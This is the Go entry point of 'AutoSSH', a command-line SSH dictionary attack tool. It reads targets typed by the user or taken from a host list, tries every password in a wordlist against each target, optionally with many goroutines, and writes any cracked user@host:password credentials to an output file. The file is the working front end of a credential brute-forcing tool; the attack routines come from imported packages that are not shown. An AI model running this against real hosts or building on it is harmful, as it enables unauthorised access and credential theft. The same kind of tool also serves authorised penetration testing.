package main

import (
	"bufio"
	"fmt"
	"log"
	"math"
	"os"
	"path"
	"strings"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshatk"
	"github.com/fatih/color"
)

const VERSION = "v1.2.1"

var infoTag = color.HiBlueString("[Info]")

func main() {
	fmt.Printf(color.YellowString(
`    _         _       ____ ____  _   _ 
   / \  _   _| |_ ___/ ___/ ___|| | | |
  / _ \| | | | __/ _ \___ \___ \| |_| |
 / ___ \ |_| | || (_) |__) |__) |  _  |
/_/   \_\__,_|\__\___/____/____/|_| |_|                               

`		),
	)
	fmt.Printf(color.YellowString("AutoSSH %s - https://github.com/cfschilham/autossh\n\n", VERSION))

	executable, err := os.Executable()
	if err != nil {
		log.Fatalln(color.HiRedString("[Error] %s\n", err.Error()))
	}
	executableDir := path.Dir(executable)

	fmt.Printf("%s Loading cfg/config.yml...\n", infoTag)
	config, err := loadcfg.LoadConfig(path.Join(executableDir, "cfg"))
	if err != nil {
		log.Fatalln(color.HiRedString("[Error] %s\n", err.Error()))
	}

	fmt.Printf("%s Loading %s...\n", infoTag, config.DictPath())
	dict, err := loadcfg.LoadDict(path.Join(executableDir, config.DictPath()))
	if err != nil {
		log.Fatalln(color.HiRedString("[Error] %s\n", err.Error()))
	}

	switch config.Mode() {
	case "manual":
		if config.UsrIsHost() {
			fmt.Println()
		} else {
			fmt.Println("Example input: 'john@johns-pc.local', 'peter@192.168.1.2'")
		}

		for {
			fmt.Print("Enter host (type 'exit' to exit): ")
			sc := bufio.NewScanner(os.Stdin)
			sc.Scan()
			input := sc.Text()
			if sc.Err() != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			if strings.ToLower(input) == "exit" {
				os.Exit(0)
			}

			// Use user input to create a new Host struct
			host, err := loadcfg.StrToHost(input, config.UsrIsHost())
			if err != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			// The IP is resolved first so that it doesn't have to be resolved again for every single password in the
			// dictionary
			ip, err := host.ResolveAddr()
			if err != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			fmt.Printf("%s Attempting to connect to %s@%s...\n", infoTag, host.Username(), host.Addr())

			var pwd string
			if config.MultiThreaded() {
				pwd, err = sshatk.SSHDictMT(ip, config.Port(), host.Username(), dict.Pwds(), config.Goroutines())
			} else {
				pwd, err = sshatk.SSHDictST(ip, config.Port(), host.Username(), dict.Pwds())
			}
			if err != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			fmt.Printf(color.GreenString("[Success] Password of %s@%s found: '%s'\n", host.Username(), host.Addr(), pwd))
			if config.OutputPath() != "" {
				credentials := fmt.Sprintf("%s@%s:%s\n", host.Username(), host.Addr(), pwd)
				if err := loadcfg.ExportToFile(credentials, config.OutputPath()); err != nil {
					fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				}
			}
		}

	case "hostlist":
		fmt.Printf("%s Loading %s...\n", infoTag, config.HostlistPath())
		hosts, err := loadcfg.LoadHostlist(path.Join(executableDir, config.HostlistPath()), config.UsrIsHost())
		if err != nil {
			log.Fatalln(color.HiRedString("[Error] %s\n", err.Error()))
		}

		// Loop through the host list.
		for i, host := range hosts {
			fmt.Printf("%s %d%% done\n", infoTag, int(math.Round(float64(i)/float64(len(hosts))*100)))
			fmt.Printf("%s Attempting to connect to '%s@%s'...\n", infoTag, host.Username(), host.Addr())

			// The IP is resolved first so that it doesn't have to be resolved again for every single password in the
			// dictionary.
			ip, err := host.ResolveAddr()
			if err != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			var pwd string
			if config.MultiThreaded() {
				pwd, err = sshatk.SSHDictMT(ip, config.Port(), host.Username(), dict.Pwds(), config.Goroutines())
			} else {
				pwd, err = sshatk.SSHDictST(ip, config.Port(), host.Username(), dict.Pwds())
			}
			if err != nil {
				fmt.Printf(color.HiRedString("[Error] %s\n", err.Error()))
				continue
			}

			fmt.Printf(color.GreenString("[Success] Password of %s@%s found: '%s'\n", host.Username(), host.Addr(), pwd))
			if config.OutputPath() != "" {
				credentials := fmt.Sprintf("%s@%s:%s\n", host.Username(), host.Addr(), pwd)
				if err := loadcfg.ExportToFile(credentials, config.OutputPath()); err != nil {
					fmt.Fprintln(os.Stderr, err.Error())
				}
			}
		}

	default:
		log.Fatalf(color.HiRedString("[Error] cfg/config.yml: '%s' is not a valid mode", config.Mode()))
	}
}
